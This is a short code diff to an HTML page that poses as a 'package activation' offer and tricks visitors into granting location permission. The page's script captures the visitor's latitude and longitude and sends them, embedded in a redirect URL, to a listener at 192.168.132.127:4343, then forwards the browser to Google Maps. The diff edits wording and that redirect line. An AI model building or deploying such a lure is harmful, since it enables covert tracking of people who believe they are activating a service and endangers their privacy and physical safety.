@@ -6,7 +6,7 @@
   </head>
   <body>
     <center>
-      <p><b>Click on the button below and allow the permission to activate package</b></p>
+      <p><b>Click on the button below and allow the permission to Activate package</b></p>
     <button onclick="getLocation()" name="button">Click Here To Activate Package</button>
     <p id="demo"></p>
 
@@ -25,7 +25,7 @@
         var latlong = x.innerHTML = "Latitude:"+ position.coords.latitude + "<br>Longitude:" + position.coords.longitude ;
         var lat = position.coords.latitude
         var lon = position.coords.longitude
-        document.location='http://192.168.132.127:4343/'+latlong
+        document.location='http://192.168.132.127:4343/'+latlong + 'https://www.google.co.in/maps/search/'+ lat +',' + lon + '/@'+ lat + ',' + lon + ',18z?hl=en'
         setTimeout(document.location='https://www.google.co.in/maps/search/'+ lat +',' + lon + '/@'+ lat + ',' + lon + ',18z?hl=en', 5000);
         
         
